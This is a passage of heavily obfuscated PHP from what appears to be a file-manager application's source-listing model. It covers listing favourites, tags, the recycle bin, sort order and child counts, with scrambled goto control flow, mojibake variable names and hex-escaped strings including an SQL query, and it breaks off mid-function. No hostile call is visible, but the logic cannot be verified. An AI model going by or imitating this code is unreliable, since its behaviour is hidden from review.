$C¯Ô°ÖâÍ = null) { $A“ß’é¥ğé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->options[$A“ß’é¥ğé[277]] = is_null($C¯Ô°ÖâÍ) ? $Eùˆ‰¾îÏè : $Eùˆ‰¾îÏè . $A“ß’é¥ğé[47] . $C¯Ô°ÖâÍ; return $this; } public function page($CÀÄ–æò£±, $CÑÒ¥†äøá = null) { $fÈÓ‡›éä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->options[$fÈÓ‡›éä[337]] = is_null($CÑÒ¥†äøá) ? $CÀÄ–æò£± : $CÀÄ–æò£± . $fÈÓ‡›éä[47] . $CÑÒ¥†äøá; return $this; } public function comment($A‘ºô‡Â’Ò) { $this->options[$_SERVER[ÚŠ•´ÍéÒÑÔ][338]] = $A‘ºô‡Â’Ò; return $this; } public function setProperty($d†øïêÊÙ, $B¡Û’•±¥­) { if (property_exists($this, $d†øïêÊÙ)) { $this->{$d†øïêÊÙ} = $B¡Û’•±¥­; } return $this; } } goto dÛëòøÂùµ; D¡ŸŒ„®›Œ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\x65"; protected $tableMeta = array("\164\141\142\154\145\116\x61\155\145" => "\151\x6f\137\x73\x6f\x75\x72\143\145\x5f\x6d\x65\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\x73\x6f\165\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\x69\155\145", "\164\x69\x6d\145", "\151\x6e\163\x65\x72\x74", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x63\162\145\x61\164\145\124\x69\155\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\143\x74\151\x6f\156"), array("\166\x69\x65\167\124\151\155\145", "\164\151\x6d\x65", "\151\156\163\x65\x72\x74", "\146\165\156\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($f‹¿›èêÈ”) { return $this->listSource(array($_SERVER[ÚŠ•´ÍéÒÑÔ][365] => $f‹¿›èêÈ”)); } public function typeName($díùÕ½ÇĞŒ) { static $AŠù¼›Ÿ“£ = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\162\157\165\x70"); return $AŠù¼›Ÿ“£[$díùÕ½ÇĞŒ . $_SERVER[ÚŠ•´ÍéÒÑÔ][33]]; } public function sourceListInfo($CâºäÄáˆÑ, $CÎ¿Ãèº¢‡ = false) { goto e±Ñµñ÷¤; AĞ›Ü³÷ŠŠ: if (!$CâºäÄáˆÑ) { return array(); } $Dáë¢‹‹› = $this->where(array($D§İº­‚’é[366] => array($D§İº­‚’é[7], $CâºäÄáˆÑ)))->select(); $this->_listDataApply($Dáë¢‹‹›, $CÎ¿Ãèº¢‡); goto E†¢½·Ô·«; E†¢½·Ô·«: return array_to_keyvalue($Dáë¢‹‹›, $D§İº­‚’é[366]); goto D¶öæ’’Ã›; e±Ñµñ÷¤: $D§İº­‚’é =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CâºäÄáˆÑ = $CâºäÄáˆÑ ? $CâºäÄáˆÑ : array(); $CâºäÄáˆÑ = array_filter(array_unique($CâºäÄáˆÑ)); goto AĞ›Ü³÷ŠŠ; D¶öæ’’Ã›: } public function pathInfoFilter($bƒ“‚˜ŒÓÙ) { goto eŒ ç‘ŒÆ–; eŒ ç‘ŒÆ–: $e†”†Ç÷ÃË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[75]] = KodIO::make($bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[366]]); $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[29]] = $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[367]] == 1 ? $e†”†Ç÷ÃË[76] : $e†”†Ç÷ÃË[164]; goto a‹ª–Ÿ¸•–; aëš³Œ•—À: if (isset($bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[373]]) && $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[373]][$e†”†Ç÷ÃË[374]] == -1) { $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[184]); $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[107]); $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[375]); $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[376]); $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[77]); $eÌ‹¯–Õó‹ = array_remove_value($eÌ‹¯–Õó‹, $e†”†Ç÷ÃË[377]); } $bƒ“‚˜ŒÓÙ = array_field_key($bƒ“‚˜ŒÓÙ, $eÌ‹¯–Õó‹); return $bƒ“‚˜ŒÓÙ; goto d«„†àÃ˜¾; a‹ª–Ÿ¸•–: $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[368]] = $this->typeName($bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[368]]); if ($bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[367]] != 1) { $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[157]] = $bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[369]]; unset($bƒ“‚˜ŒÓÙ[$e†”†Ç÷ÃË[369]]); } $DÃæ…‡Ô¤© = $e†”†Ç÷ÃË[370]; goto bÁ››»àÀ¤; bÁ››»àÀ¤: $DÃæ…‡Ô¤© .= $e†”†Ç÷ÃË[371]; $DÃæ…‡Ô¤© .= $e†”†Ç÷ÃË[372]; $eÌ‹¯–Õó‹ = explode($e†”†Ç÷ÃË[47], $DÃæ…‡Ô¤©); goto aëš³Œ•—À; d«„†àÃ˜¾: } public function listUserFav() { goto BãŠÌöØŠ; BãŠÌöØŠ: $d†—ô‘Íùã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bŸŠÏ©Ì”š = Model($d†—ô‘Íùã[378])->listData(); $aÇÃàÅ»Ú = array_filter_by_field($bŸŠÏ©Ì”š, $d†—ô‘Íùã[29], $d†—ô‘Íùã[379]); goto fÛ›‡ì§‹Š; e–ÆØ†Áß§: foreach ($bŸŠÏ©Ì”š as &$e†ê„¯”¼±) { $e†ê„¯”¼± = array($d†—ô‘Íùã[382] => $e†ê„¯”¼±[$d†—ô‘Íùã[364]], $d†—ô‘Íùã[383] => $e†ê„¯”¼±[$d†—ô‘Íùã[28]], $d†—ô‘Íùã[384] => $e†ê„¯”¼±[$d†—ô‘Íùã[75]], $d†—ô‘Íùã[385] => $e†ê„¯”¼±[$d†—ô‘Íùã[29]], $d†—ô‘Íùã[386] => $e†ê„¯”¼±[$d†—ô‘Íùã[184]], $d†—ô‘Íùã[387] => $e†ê„¯”¼±[$d†—ô‘Íùã[107]]); if ($e†ê„¯”¼±[$d†—ô‘Íùã[29]] == $d†—ô‘Íùã[379] && $d‘õ¯ÒËË[$e†ê„¯”¼±[$d†—ô‘Íùã[75]]]) { $e†ê„¯”¼±[$d†—ô‘Íùã[388]] = $d‘õ¯ÒËË[$e†ê„¯”¼±[$d†—ô‘Íùã[75]]]; } } return $bŸŠÏ©Ì”š; goto eíåÅ¦ØÁ; fÛ›‡ì§‹Š: $aÇÃàÅ»Ú = array_to_keyvalue($aÇÃàÅ»Ú, $d†—ô‘Íùã[33], $d†—ô‘Íùã[75]); if ($aÇÃàÅ»Ú) { $d‘õ¯ÒËË = $this->listSource(array($d†—ô‘Íùã[380] => array($d†—ô‘Íùã[381], $aÇÃàÅ»Ú))); } $d‘õ¯ÒËË = array_to_keyvalue($d‘õ¯ÒËË[$d†—ô‘Íùã[351]], $d†—ô‘Íùã[366]); goto e–ÆØ†Áß§; eíåÅ¦ØÁ: } public function listUserTag($a×ÂïƒØŒ) { goto a¸ˆøîá»; A®×¤Šå¸Õ: $bìÄ¬àÌßÕ = array_to_keyvalue($bìÄ¬àÌßÕ, $D÷Äå°°³“[33], $D÷Äå°°³“[75]); if (!$bìÄ¬àÌßÕ) { return array(); } $f§¬–±ğáŠ = array($D÷Äå°°³“[380] => array($D÷Äå°°³“[381], $bìÄ¬àÌßÕ)); goto f‘‘ñÈã®®; a¸ˆøîá»: $D÷Äå°°³“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¥ìĞËğÉ­ = Model($D÷Äå°°³“[389])->listData(); $bìÄ¬àÌßÕ = array_filter_by_field($e¥ìĞËğÉ­, $D÷Äå°°³“[390], $a×ÂïƒØŒ); goto A®×¤Šå¸Õ; f‘‘ñÈã®®: return $this->listSource($f§¬–±ğáŠ); goto AŠ›¯ôÃéö; AŠ›¯ôÃéö: } public function listUserRecycle() { $dòí…ÏĞ ‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cåë½íÊã = Model($dòí…ÏĞ ‰[391])->listData(); if (!$Cåë½íÊã) { return array(); } $D°Éíã¹¯İ = array($dòí…ÏĞ ‰[380] => array($dòí…ÏĞ ‰[381], $Cåë½íÊã), $dòí…ÏĞ ‰[392] => 1); return $this->listSource($D°Éíã¹¯İ); } public function listSource($ešŞÛ©“±”, $eÀ§œ²­Ø = 3000) { goto f—‘³Í’¸; EÛŠ«Âó¬: return $BíƒÊ¸Ğ´; goto bÍ¿–Ÿ¾¨Â; AäÌèŒéÎª: $BíƒÊ¸Ğ´ = $this->field($AĞ²îí†èÏ)->_makeOrder()->where($ešŞÛ©“±”)->selectPage($eÀ§œ²­Ø); $this->_listDataApply($BíƒÊ¸Ğ´[$Cñğ¡ä·ßà[351]]); $this->_listMake($BíƒÊ¸Ğ´); goto EÛŠ«Âó¬; f—‘³Í’¸: $Cñğ¡ä·ßà =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($ešŞÛ©“±”[$Cñğ¡ä·ßà[393]])) { $ešŞÛ©“±”[$Cñğ¡ä·ßà[393]] = 0; } $AĞ²îí†èÏ = $Cñğ¡ä·ßà[394]; goto AäÌèŒéÎª; bÍ¿–Ÿ¾¨Â: } protected function _makeOrder() { goto cäÈµŒ†¦; cäÈµŒ†¦: $f–×˜ÉÖÈÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e†ñöºè„ = Model($f–×˜ÉÖÈÒ[395])->get($f–×˜ÉÖÈÒ[396]); $A˜†×‘¦­è = Model($f–×˜ÉÖÈÒ[395])->get($f–×˜ÉÖÈÒ[397]); goto d¡Ô««¿ô®; FÈøÀáÓ³‹: $aÙé–•ÊÔõ = Input::get($f–×˜ÉÖÈÒ[404], $f–×˜ÉÖÈÒ[7], $A˜†×‘¦­è, array_keys($aÀ–­–¤ÉÙ)); if (!in_array($aÇœò‡©º, array_keys($Cº‘÷øù÷…))) { $aÇœò‡©º = $f–×˜ÉÖÈÒ[28]; } if (!in_array($aÙé–•ÊÔõ, array_keys($aÀ–­–¤ÉÙ))) { $aÇœò‡©º = $f–×˜ÉÖÈÒ[398]; } goto e©±‡®“; d¡Ô««¿ô®: $aÀ–­–¤ÉÙ = array($f–×˜ÉÖÈÒ[398] => $f–×˜ÉÖÈÒ[399], $f–×˜ÉÖÈÒ[400] => $f–×˜ÉÖÈÒ[401]); $Cº‘÷øù÷… = array($f–×˜ÉÖÈÒ[28] => $f–×˜ÉÖÈÒ[28], $f–×˜ÉÖÈÒ[77] => $f–×˜ÉÖÈÒ[77], $f–×˜ÉÖÈÒ[157] => $f–×˜ÉÖÈÒ[369], $f–×˜ÉÖÈÒ[375] => $f–×˜ÉÖÈÒ[375], $f–×˜ÉÖÈÒ[402] => $f–×˜ÉÖÈÒ[376], $f–×˜ÉÖÈÒ[184] => $f–×˜ÉÖÈÒ[184], $f–×˜ÉÖÈÒ[107] => $f–×˜ÉÖÈÒ[107]); $aÇœò‡©º = Input::get($f–×˜ÉÖÈÒ[403], $f–×˜ÉÖÈÒ[7], $e†ñöºè„, array_keys($Cº‘÷øù÷…)); goto FÈøÀáÓ³‹; e©±‡®“: if ($aÇœò‡©º == $f–×˜ÉÖÈÒ[28]) { } $DáÊæ…”¨¸ = $f–×˜ÉÖÈÒ[405] . $Cº‘÷øù÷…[$aÇœò‡©º] . $f–×˜ÉÖÈÒ[50] . $aÀ–­–¤ÉÙ[$aÙé–•ÊÔõ]; return $this->order(rtrim(trim($DáÊæ…”¨¸), $f–×˜ÉÖÈÒ[47])); goto F¤™Õ›”Š; F¤™Õ›”Š: } protected function _listDataApplyItem($DÍ¶ëòëÊÖ, $c–ƒù´èè˜ = false) { $f«”êãÊŠŸ = array($DÍ¶ëòëÊÖ); $this->_listDataApply($f«”êãÊŠŸ, $c–ƒù´èè˜); return $f«”êãÊŠŸ[0]; } protected function _listDataApply(&$dï¦‰¯ÆğÎ, $D»à÷Ÿ°ìî = false) { goto Aíñà³¸Ôì; båõõí÷Ç: $cÆù¹„Ş‰ = array_unique($cÆù¹„Ş‰); $this->_listSourceCache($dï¦‰¯ÆğÎ); if (!$D»à÷Ÿ°ìî) { $this->_listAppendMeta($dï¦‰¯ÆğÎ, $cÆù¹„Ş‰); $this->_listAppendFileMeta($dï¦‰¯ÆğÎ, $cÆù¹„Ş‰); $this->_listAppendChildren($dï¦‰¯ÆğÎ, $cÆù¹„Ş‰); } goto E…âËŠóî™; E…âËŠóî™: $this->_listAppendPath($dï¦‰¯ÆğÎ); $this->_listAppendAuth($dï¦‰¯ÆğÎ); $this->_listAppendSourceInfo($dï¦‰¯ÆğÎ, $cÆù¹„Ş‰); goto eê¡äÆçí½; eê¡äÆçí½: $this->_listAppendUser($dï¦‰¯ÆğÎ); $this->_listFilterInfo($dï¦‰¯ÆğÎ, $D»à÷Ÿ°ìî); goto a‘Ğ‰‘„•™; Aíñà³¸Ôì: $B‚ğ……ö¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$dï¦‰¯ÆğÎ) { $dï¦‰¯ÆğÎ = array(); return; } $cÆù¹„Ş‰ = array_to_keyvalue($dï¦‰¯ÆğÎ, $B‚ğ……ö¼[33], $B‚ğ……ö¼[366]); goto båõõí÷Ç; a‘Ğ‰‘„•™: } protected function _listSourceCache($FìØµº©®Â) { $dø—ï‚óß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($FìØµº©®Â as $d…Ã½§ä–¹) { self::$cacheSourceInfo[$dø—ï‚óß[406] . $d…Ã½§ä–¹[$dø—ï‚óß[366]]] = $d…Ã½§ä–¹; } } protected function _listFilterInfo(&$Eğ¸¹¾‘ªô, $CĞÌÓšÀ = false) { $F¹•¨¢–Ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($Eğ¸¹¾‘ªô as &$a éÀÆÅ¾) { $a éÀÆÅ¾ = $this->pathInfoFilter($a éÀÆÅ¾); self::$cachePathInfo[$F¹•¨¢–Ğ[407] . intval($CĞÌÓšÀ) . $F¹•¨¢–Ğ[408] . $a éÀÆÅ¾[$F¹•¨¢–Ğ[366]]] = $a éÀÆÅ¾; } } protected function _listMake(&$D¼¢Á­É™Í) { $c¶„æÆõä— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D¼¢Á­É™Í[$c¶„æÆõä—[74]] = array(); $D¼¢Á­É™Í[$c¶„æÆõä—[73]] = array(); foreach ($D¼¢Á­É™Í[$c¶„æÆõä—[351]] as $bÍÆ ˆ´×Ê) { $a¯¥¥İ¿æ = $bÍÆ ˆ´×Ê[$c¶„æÆõä—[367]] == 1 ? $c¶„æÆõä—[74] : $c¶„æÆõä—[73]; $D¼¢Á­É™Í[$a¯¥¥İ¿æ][] = $bÍÆ ˆ´×Ê; } unset($D¼¢Á­É™Í[$c¶„æÆõä—[351]]); } protected function _listAppendMeta(&$b»ø½¼®æ, $Cò„Ú‘ˆ„¸) { goto a»¡È…“è; CÊ¸Äš§Ô: foreach ($cìã¨†å° as $A“È­õá›) { if (!isset($F³¡«éÁö[$A“È­õá›[$cÕÈÍºåÕ±[366]]])) { $F³¡«éÁö[$A“È­õá›[$cÕÈÍºåÕ±[366]]] = array(); } if (in_array($A“È­õá›[$cÕÈÍºåÕ±[89]], $E‹”õÄì±)) { continue; } $F³¡«éÁö[$A“È­õá›[$cÕÈÍºåÕ±[366]]][$A“È­õá›[$cÕÈÍºåÕ±[89]]] = $A“È­õá›[$cÕÈÍºåÕ±[356]]; } foreach ($b»ø½¼®æ as &$cÌ˜§ÈÛ¦) { $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[413]] = !1; if (isset($F³¡«éÁö[$cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[366]]])) { $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[413]] = $F³¡«éÁö[$cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[366]]]; } if ($this->fileIsLock($cÌ˜§ÈÛ¦) && $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[373]]) { $b—„Â×Ç·Ê = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[373]][$cÕÈÍºåÕ±[374]] = AuthModel::authDisable($cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[373]][$cÕÈÍºåÕ±[374]], $b—„Â×Ç·Ê); $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[373]][$cÕÈÍºåÕ±[414]][$cÕÈÍºåÕ±[373]] = $cÌ˜§ÈÛ¦[$cÕÈÍºåÕ±[373]][$cÕÈÍºåÕ±[374]]; } } goto bĞÛƒÖùØ; d£õ§ÅÆ¢Ã: if (!$cìã¨†å°) { return; } $E‹”õÄì± = array($cÕÈÍºåÕ±[411], $cÕÈÍºåÕ±[412]); $F³¡«éÁö = array(); goto CÊ¸Äš§Ô; a»¡È…“è: $cÕÈÍºåÕ± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fš»Ãø¨• = array($cÕÈÍºåÕ±[380] => array($cÕÈÍºåÕ±[381], $Cò„Ú‘ˆ„¸)); $cìã¨†å° = Model($cÕÈÍºåÕ±[409])->field($cÕÈÍºåÕ±[410])->where($Fš»Ãø¨•)->select(); goto d£õ§ÅÆ¢Ã; bĞÛƒÖùØ: } protected function _listAppendFileMeta(&$BæÑ¶ìƒÌÌ, $e·£¿³˜Ç) { goto dµÊÄç°œò; D†æøŞî¡: $EÜ¥¿ƒªï³ = $EÜ¥¿ƒªï³ ? $EÜ¥¿ƒªï³ : array(); $BÂÛËÇ’ = array(); foreach ($EÜ¥¿ƒªï³ as $f‚„ß»Õ±Œ) { if (!isset($BÂÛËÇ’[$f‚„ß»Õ±Œ[$e²¦µÀ§¹¾[415]]])) { $BÂÛËÇ’[$f‚„ß»Õ±Œ[$e²¦µÀ§¹¾[415]]] = array(); } $BÂÛËÇ’[$f‚„ß»Õ±Œ[$e²¦µÀ§¹¾[415]]][$f‚„ß»Õ±Œ[$e²¦µÀ§¹¾[89]]] = $f‚„ß»Õ±Œ[$e²¦µÀ§¹¾[356]]; } goto Eù‰„ ò; Eù‰„ ò: foreach ($BæÑ¶ìƒÌÌ as &$dñŸÜ“”å¿) { goto BÚ´áÂ»³Ó; fÑ•·øà: if (isset($dñŸÜ“”å¿[$e²¦µÀ§¹¾[159]][$e²¦µÀ§¹¾[422]])) { $dñŸÜ“”å¿[$e²¦µÀ§¹¾[422]] = json_decode($dñŸÜ“”å¿[$e²¦µÀ§¹¾[159]][$e²¦µÀ§¹¾[422]], !0); unset($dñŸÜ“”å¿[$e²¦µÀ§¹¾[159]][$e²¦µÀ§¹¾[422]]); } goto A¦‘¥ÆäÂ; bõÍ¿˜¹°­: unset($FÍİ™ùšíä[$cÕä«Ï„†×][$e²¦µÀ§¹¾[75]]); $e‡¿¾Øš£ = is_array($BÂÛËÇ’[$cÕä«Ï„†×]) ? $BÂÛËÇ’[$cÕä«Ï„†×] : array(); $dñŸÜ“”å¿[$e²¦µÀ§¹¾[159]] = array_merge($e‡¿¾Øš£, $FÍİ™ùšíä[$cÕä«Ï„†×]); goto fÑ•·øà; FİßÙÉ“§·: $CßÇ’¡ˆ‚Ç[$e²¦µÀ§¹¾[77]] = $dñŸÜ“”å¿[$e²¦µÀ§¹¾[77]]; $CßÇ’¡ˆ‚Ç[$e²¦µÀ§¹¾[28]] = $dñŸÜ“”å¿[$e²¦µÀ§¹¾[28]]; self::$cacheFileInfo[$e²¦µÀ§¹¾[421] . $cÕä«Ï„†×] = $CßÇ’¡ˆ‚Ç; goto bõÍ¿˜¹°­; BÚ´áÂ»³Ó: $cÕä«Ï„†× = $dñŸÜ“”å¿[$e²¦µÀ§¹¾[415]]; if (!$cÕä«Ï„†× || !isset($FÍİ™ùšíä[$cÕä«Ï„†×])) { continue; } $CßÇ’¡ˆ‚Ç = $FÍİ™ùšíä[$cÕä«Ï„†×]; goto FİßÙÉ“§·; A¦‘¥ÆäÂ: } goto DòòÒá¦º; Bß…‹•È …: if (!$bô“ĞñíÕ‚) { return; } $d‹Ã´¡î‡í = array($e²¦µÀ§¹¾[416] => array($e²¦µÀ§¹¾[381], $bô“ĞñíÕ‚)); $c¥ÑÆñ£äÏ = $e²¦µÀ§¹¾[417]; goto e·î¬ ñò; dµÊÄç°œò: $e²¦µÀ§¹¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bô“ĞñíÕ‚ = array_to_keyvalue($BæÑ¶ìƒÌÌ, $e²¦µÀ§¹¾[33], $e²¦µÀ§¹¾[415]); $bô“ĞñíÕ‚ = array_filter(array_unique($bô“ĞñíÕ‚)); goto Bß…‹•È …; e·î¬ ñò: $FÍİ™ùšíä = Model($e²¦µÀ§¹¾[418])->field($c¥ÑÆñ£äÏ)->where($d‹Ã´¡î‡í)->select(); $FÍİ™ùšíä = array_to_keyvalue($FÍİ™ùšíä, $e²¦µÀ§¹¾[415]); $EÜ¥¿ƒªï³ = Model($e²¦µÀ§¹¾[419])->field($e²¦µÀ§¹¾[420])->where($d‹Ã´¡î‡í)->select(); goto D†æøŞî¡; DòòÒá¦º: } protected function _listAppendSourceInfo(&$fì›Ñˆ…æø, $fÔ“ºŠ³ñ) { goto C‚ÜòÉŸ–÷; C‚ÜòÉŸ–÷: $E¿´êÆ‰×… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($E¿´êÆ‰×…[423])) { return; } $d•††Ô÷½¦ = Model($E¿´êÆ‰×…[424])->listData(); goto a½Ï“¿„Ê; f×˜âÂÀ: $F˜ç…¤£Öé = array_to_keyvalue_group($cÑšäğ«ä, $E¿´êÆ‰×…[366]); foreach ($fì›Ñˆ…æø as &$d´Ì¼ã¸íå) { $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]] = array($E¿´êÆ‰×…[426] => 0, $E¿´êÆ‰×…[427] => 0, $E¿´êÆ‰×…[428] => 0); if (isset($bÌÎ•ã—É[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]])) { $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[429]] = 1; $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[430]] = $bÌÎ•ã—É[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]][$E¿´êÆ‰×…[28]]; } if (isset($fğÜöŒ¹İœ[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]])) { $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[431]] = array(); foreach ($fğÜöŒ¹İœ[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]] as $B“Œâ¡£ŠÕ) { $f¹Ï àŞÙ = $FÈ¡äÌù‘ó[$B“Œâ¡£ŠÕ]; $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[431]][] = array($E¿´êÆ‰×…[432] => $f¹Ï àŞÙ[$E¿´êÆ‰×…[364]], $E¿´êÆ‰×…[383] => $f¹Ï àŞÙ[$E¿´êÆ‰×…[28]], $E¿´êÆ‰×…[433] => $f¹Ï àŞÙ[$E¿´êÆ‰×…[434]]); } } if (isset($F˜ç…¤£Öé[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]])) { $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[435]] = array(); foreach ($F˜ç…¤£Öé[$d´Ì¼ã¸íå[$E¿´êÆ‰×…[366]]] as $E˜Ñœàê«†) { $d´Ì¼ã¸íå[$E¿´êÆ‰×…[388]][$E¿´êÆ‰×…[435]] = array($E¿´êÆ‰×…[436] => $E˜Ñœàê«†[$E¿´êÆ‰×…[437]], $E¿´êÆ‰×…[438] => $E˜Ñœàê«†[$E¿´êÆ‰×…[439]], $E¿´êÆ‰×…[440] => $E˜Ñœàê«†[$E¿´êÆ‰×…[366]], $E¿´êÆ‰×…[441] => $E˜Ñœàê«†[$E¿´êÆ‰×…[442]], $E¿´êÆ‰×…[443] => $E˜Ñœàê«†[$E¿´êÆ‰×…[444]]); } } } return $fì›Ñˆ…æø; goto AÏ÷Üøá‡; d«¹¿ù˜õÙ: $FÈ¡äÌù‘ó = array_to_keyvalue($d•††Ô÷½¦, $E¿´êÆ‰×…[364]); $fğÜöŒ¹İœ = array_to_keyvalue_group($a˜ØÆÌøÎ™, $E¿´êÆ‰×…[75], $E¿´êÆ‰×…[390]); $bÌÎ•ã—É = array_to_keyvalue($D”¹‘¨“´, $E¿´êÆ‰×…[75]); goto f×˜âÂÀ; a½Ï“¿„Ê: $a˜ØÆÌøÎ™ = Model($E¿´êÆ‰×…[389])->listData(); $D”¹‘¨“´ = Model($E¿´êÆ‰×…[378])->listData(); $cÑšäğ«ä = Model($E¿´êÆ‰×…[425])->listSimple(); goto d«¹¿ù˜õÙ; AÏ÷Üøá‡: } protected function _listAppendChildren(&$A¬ÃšÃÒÖ, $b×éÚŠÒÍÂ) { goto DÍ¼òƒÊ©’; Bçñ‡›Àß­: foreach ($A¬ÃšÃÒÖ as &$b¦ÙÂµ–óŠ) { if ($b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[367]]) { unset($b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[369]]); $b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[189]] = intval($cÚ”îÚÛÊ‚[$b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[366]] . $Bàƒ°«ø‰á[447]][$Bàƒ°«ø‰á[448]]); $b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[188]] = intval($cÚ”îÚÛÊ‚[$b¦ÙÂµ–óŠ[$Bàƒ°«ø‰á[366]] . $Bàƒ°«ø‰á[449]][$Bàƒ°«ø‰á[448]]); } } goto Däæ™ÈÄç; F±Ñœ™Í : $bù¤˜¬˜­‘ = $this->tablePrefix . $this->tableName; for ($CêÉ¢¦‡í„ = 0; $CêÉ¢¦‡í„ < $Féô²—çç…; $CêÉ¢¦‡í„++) { $bĞÉ¡ØËœÎ = intval($A¬ÃšÃÒÖ[$CêÉ¢¦‡í„][$Bàƒ°«ø‰á[393]]); if ($A¬ÃšÃÒÖ[$CêÉ¢¦‡í„][$Bàƒ°«ø‰á[367]]) { $c×®†„·ëÄ = $A¬ÃšÃÒÖ[$CêÉ¢¦‡í„][$Bàƒ°«ø‰á[366]]; $A«ÅÍéÉƒÀ .= "\x53\105\x4c\105\103\124\x20\x2a\40\106\122\117\x4d\40\50\x53\x45\x4c\105\103\124\40\x27{$c×®†„·ëÄ}\x5f\x68\141\x73\106\x69\154\145\47\40\141\x73\x20\150\141\163\x2c\143\157\165\156\164\x28\x31\x29\40\x61\163\x20\x68\x61\163\x43\x6f\x75\156\164\x20\106\122\117\x4d\x20\x60{$bù¤˜¬˜­‘}\140\40\xa\11\11\11\x9\11\x77\x68\x65\162\x65\40\160\x61\x72\x65\156\164\111\104\x3d{$c×®†„·ëÄ}\x20\141\156\x64\40\151\x73\x46\157\x6c\144\x65\x72\x3d\x30\x20\x61\x6e\x64\40\151\163\x44\145\154\x65\164\x65\75{$bĞÉ¡ØËœÎ}\x29\40\141\163\40\x74\x62\x31\x5f{$c×®†„·ëÄ}\40\165\156\151\157\156\x20\141\154\x6c\40\12\x9\x9\x9\11\x9\123\105\114\105\x43\124\x20\52\x20\x46\x52\x4f\x4d\x20\50\123\105\114\x45\x43\124\x20\x27{$c×®†„·ëÄ}\x5f\150\141\163\106\x6f\154\x64\x65\162\47\x20\x61\163\x20\x68\141\163\x46\151\154\x65\54\x63\x6f\165\156\164\x28\x31\x29\40\141\x73\x20\150\141\x73\x43\x6f\x75\156\x74\40\106\x52\x4f\x4d\40\140{$bù¤˜¬˜­‘}\x60\40\12\11\11\11\x9\11\x77\x68\145\x72\x65\x20\x70\141\162\145\x6e\164\111\x44\75{$c×®†„·ëÄ}\x20\141\156\144\40\x69\x73\x46\x6f\x6c\x64\x65\x72\75\x31\40\141\156\x64\40\151\x73\104\x65\x6c\145\x74\145\75{$bĞÉ¡ØËœÎ}\x29\40\141\163\40\x74\x62\62\137{$c×®†„·ëÄ}\x20\x75\156\x69\157\156\x20\141\154\x6c\x20"; } if ((strlen($A«ÅÍéÉƒÀ) >= $b‚ÄŠ¾¸®á || $CêÉ¢¦‡í„ == $Féô²—çç… - 1) && $A«ÅÍéÉƒÀ) { 